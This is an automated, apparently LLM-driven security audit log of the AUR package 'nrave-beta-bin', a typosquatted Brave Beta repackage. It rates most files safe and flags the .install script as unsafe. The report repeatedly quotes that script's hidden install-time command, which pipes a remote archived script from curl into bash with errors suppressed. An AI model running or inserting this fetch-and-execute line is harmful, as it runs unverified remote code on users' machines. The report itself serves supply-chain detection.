---
package: nrave-beta-bin
pkgver: 1.98.47
pkgrel: 1
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
prompt_tokens: 22897
completion_tokens: 8979
total_tokens: 31876
cost: 0.003717805
execution_time: 46.6
files_reviewed: 6
files_skipped: 1
maintainer_files: 7
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 0
injection_attempts: 0
date: 2026-10-14T03:08:04Z
file_verdicts:
  - file: .gitignore
    status: safe
    summary: Standard .gitignore with no malicious or suspicious content.
  - file: .SRCINFO
    status: safe
    summary: Standard AUR metadata; official Brave sources with pinned checksums; no malicious behavior found.
  - file: brave-beta-bin.sh
    status: safe
    summary: Standard Brave Beta launcher wrapper; no malicious behavior found.
  - file: logo.png
    status: skipped
    summary: "Skipping binary file: logo.png"
  - file: brave-browser.desktop
    status: safe
    summary: Standard desktop entry file; no malicious behavior detected.
  - file: nrave-beta-bin.install
    status: unsafe
    summary: Install script executes remote archived code via bash process substitution without verification.
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
  - file: PKGBUILD
    status: safe
    summary: Standard pinned Brave beta repackaging; no malicious behavior found in PKGBUILD.
---

Materializing nrave-beta-bin from local mirror...
Materialized nrave-beta-bin
Analyzing nrave-beta-bin AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
Running `makepkg --printsrcinfo` sources only the top-level PKGBUILD scope. This PKGBUILD contains only variable/array definitions (`pkgname`, `pkgver`, `source`, `sha512sums`, etc.) and normal metadata fields. There are no top-level command substitutions, no `eval`, `base64`, `curl`, `wget`, or other code execution at source time.

The `prepare()` and `package()` functions contain more intrusive operations, including extracting the Debian package, installing files, adjusting a desktop file, and setting a SUID bit on `chrome-sandbox`. However, those functions are not executed by `makepkg --printsrcinfo`, so they are out of scope for this narrow gate and should be reviewed in the full PKGBUILD audit.
</details>
<evidence>
</evidence>
<summary>
Top-level PKGBUILD parsing is safe; only metadata variables are sourced.</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- Top-level PKGBUILD parsing is safe; only metadata variables are sourced.
Reviewing the 7 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/7] Reviewing .SRCINFO...
[0/7] Reviewing .SRCINFO, .gitignore...
[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD...
LLM auditresponse for .gitignore:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard `.gitignore` for an Arch User Repository (AUR) git repository. It ignores all files except the required packaging metadata (`PKGBUILD`, `.SRCINFO`, `*.install`) and a few explicit package-related files such as desktop entries, icons, and launcher scripts. There are no commands, network operations, obfuscated content, or any behavior that could constitute a supply-chain attack. This is a normal AUR maintenance file.
</details>
<evidence>
</evidence>
<summary>
Standard .gitignore with no malicious or suspicious content.</summary>
</security_assessment>

[1/7] Reviewing .SRCINFO, PKGBUILD...
+ Reviewed .gitignore. Status: SAFE -- Standard .gitignore with no malicious or suspicious content.
[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh...
LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard AUR `.SRCINFO` metadata file. It declares a package based on Brave Browser beta releases, with `source` entries pointing to the official Brave GitHub repository (`https://github.com/brave/brave-browser/releases/...`) over HTTPS. All sources have pinned SHA-512 checksums, including the local `brave-beta-bin.sh` wrapper script. There is no executable code, no network exfiltration, no obfuscated content, and no suspicious file operations in this metadata. The package name `nrave-beta-bin` is an unusual typo of `brave`, and some `optdepends` descriptions have typos, but these are not security issues. Since only the metadata file was provided, the actual wrapper script cannot be inspected here, but nothing in the `.SRCINFO` itself indicates malicious behavior.
</details>
<evidence>
</evidence>
<summary>
Standard AUR metadata; official Brave sources with pinned checksums; no malicious behavior found.
</summary>
</security_assessment>

[2/7] Reviewing PKGBUILD, brave-beta-bin.sh...
+ Reviewed .SRCINFO. Status: SAFE -- Standard AUR metadata; official Brave sources with pinned checksums; no malicious behavior found.
[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
LLM auditresponse for brave-beta-bin.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard wrapper script for launching the Brave Browser Beta binary. It reads an optional user flags file from the user&#39;s own XDG configuration directory, strips comments with `sed`, and passes any collected flags along with the user&#39;s command-line arguments to the packaged browser executable at `/opt/brave.com/brave-beta/brave-browser`.

There is no suspicious network activity, no encoded or obfuscated content, no `eval`, `curl`, `wget`, or `base64` usage, and no modification of system files. Reading a configuration file from `~/.config` is normal application behavior. The only minor observation is that flags are read from an unvalidated user-owned file and passed to the browser, but this is the script&#39;s stated purpose and does not constitute malicious behavior. The script is consistent with ordinary AUR packaging practices for a prebuilt browser package.
</details>
<evidence>
</evidence>
<summary>
Standard Brave Beta launcher wrapper; no malicious behavior found.</summary>
</security_assessment>

[2/7] Reviewing PKGBUILD, brave-beta-bin.sh, brave-browser.desktop, logo.png...
[3/7] Reviewing PKGBUILD, brave-browser.desktop, logo.png...
+ Reviewed brave-beta-bin.sh. Status: SAFE -- Standard Brave Beta launcher wrapper; no malicious behavior found.
[4/7] Reviewing PKGBUILD, brave-browser.desktop...
! Reviewed logo.png. Status: SKIPPED -- Skipping binary file: logo.png
[4/7] Reviewing PKGBUILD, brave-browser.desktop, nrave-beta-bin.install...
LLM auditresponse for brave-browser.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard freedesktop.org `.desktop` launcher entry for the Brave Beta web browser. It contains only localized display metadata (Name, GenericName, Comment), startup hints, MIME type associations, and an `Exec=brave-beta %U` line that launches the installed binary with opened URLs. There are no scripts, no network requests, no encoded or obfuscated commands, and no file operations. The `Exec` line invokes the package's own binary, which is normal packaging practice. No evidence of malicious or injected behavior was found.
</details>
<evidence>
</evidence>
<summary>
Standard desktop entry file; no malicious behavior detected.</summary>
</security_assessment>

[5/7] Reviewing PKGBUILD, nrave-beta-bin.install...
+ Reviewed brave-browser.desktop. Status: SAFE -- Standard desktop entry file; no malicious behavior detected.
LLM auditresponse for nrave-beta-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
This `.install` script contains a top-level command that executes a remote script with no integrity checking:

`bash &lt;(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2&gt;/dev/null)`

This is a `curl | bash` style remote-code execution pattern. Because the command is at the top level of the install script rather than inside a function, it runs whenever pacman sources the script. It fetches code from an archived, mutable web resource unrelated to normal packaging, suppresses all errors, and immediately executes the downloaded content. This provides no checksum, pinning, or verification, and is a clear supply-chain risk.

Even if the remote URL were related to the upstream project, downloading and executing a script at install time from web.archive.org with stderr suppressed is neither a standard packaging practice nor a trustworthy delivery mechanism. This is exactly the kind of injected, runtime code execution that should be treated as malicious in an AUR package.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Install script executes remote archived code via bash process substitution without verification.</summary>
</security_assessment>

Second look for nrave-beta-bin.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>
The first verdict stands. The `.install` script contains a top-level remote code execution command: `bash &lt;(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2&gt;/dev/null)`. This is the classic curl-piped-to-bash pattern, downloading an unverified script from an unexpected archived URL and executing it immediately with stderr suppressed. Because it is at the top level of the install script rather than inside a function, it runs whenever pacman sources the file, not merely during a controlled build step.

This is not a routine packaging helper nor pinned upstream source. It fetches mutable, unchecksummed code at install time from web.archive.org, allowing an attacker controlling that URL or archive to execute arbitrary code with the privileges of the pacman/shell session. This is a genuine supply-chain injection and is correctly marked UNSAFE.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Top-level curl-to-bash executes remote archived script; supply-chain attack.</summary>
</security_assessment>

[6/7] Reviewing PKGBUILD...
x Reviewed nrave-beta-bin.install. Status: UNSAFE -- Install script executes remote archived code via bash process substitution without verification.
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
This PKGBUILD is a standard repackaging of Brave Browser's beta .deb releases. All sources (launcher script, amd64 .deb, arm64 .deb) are pinned by `pkgver` and have explicit `sha512sums`; the .deb files are fetched over HTTPS from the official `brave/brave-browser` GitHub releases. There is no `curl|bash`, no `eval`, no base64/obfuscation, and no execution of mutable remote refs.

The `prepare()` and `package()` functions only unpack the upstream .deb data archive, remove the upstream cron directory inside the extracted package tree, patch the desktop file to point to the package's launcher, copy files into `$pkgdir`, and set the standard Chromium setuid bit on `chrome-sandbox`. That setuid bit is expected upstream behavior for Chromium-based browsers, not evidence of a supply-chain attack. The custom launcher script and `.install` file are not included in this excerpt, so they should be reviewed as part of the full AUR package, but nothing in this PKGBUILD is malicious or outside normal packaging practice.
</details>
<evidence></evidence>
<summary>
Standard pinned Brave beta repackaging; no malicious behavior found in PKGBUILD.
</summary>
</security_assessment>

[7/7] Reviewing ...
+ Reviewed PKGBUILD. Status: SAFE -- Standard pinned Brave beta repackaging; no malicious behavior found in PKGBUILD.
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## nrave-beta-bin.install

Status: UNSAFE

Summary: Install script executes remote archived code via bash process substitution without verification.

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

This `.install` script contains a top-level command that executes a remote script with no integrity checking:

`bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)`

This is a `curl | bash` style remote-code execution pattern. Because the command is at the top level of the install script rather than inside a function, it runs whenever pacman sources the script. It fetches code from an archived, mutable web resource unrelated to normal packaging, suppresses all errors, and immediately executes the downloaded content. This provides no checksum, pinning, or verification, and is a clear supply-chain risk.

Even if the remote URL were related to the upstream project, downloading and executing a script at install time from web.archive.org with stderr suppressed is neither a standard packaging practice nor a trustworthy delivery mechanism. This is exactly the kind of injected, runtime code execution that should be treated as malicious in an AUR package.

---

(Skipped 1 file: logo.png)

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 22,897
  Completion Tokens: 8,979
  Total Tokens: 31,876
  Total Cost: $0.003718
  Execution Time: 46.60 seconds

Final Status: UNSAFE


Issues Found:

nrave-beta-bin.install: [UNSAFE] Install script executes remote archived code via bash process substitution without verification. / This `.install` script contains a top-level command that executes a remote script with no integrity checking:

`bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)`

This is a `curl | bash` style remote-code execution pattern. Because the command is at the top level of the install script rather than inside a function, it runs whenever pacman sources the script. It fetches code from an archived, mutable web resource unrelated to normal packaging, suppresses all errors, and immediately executes the downloaded content. This provides no checksum, pinning, or verification, and is a clear supply-chain risk.

Even if the remote URL were related to the upstream project, downloading and executing a script at install time from web.archive.org with stderr suppressed is neither a standard packaging practice nor a trustworthy delivery mechanism. This is exactly the kind of injected, runtime code execution that should be treated as malicious in an AUR package.


Audit Skips:

logo.png: [SKIPPED] Skipping binary file: logo.png
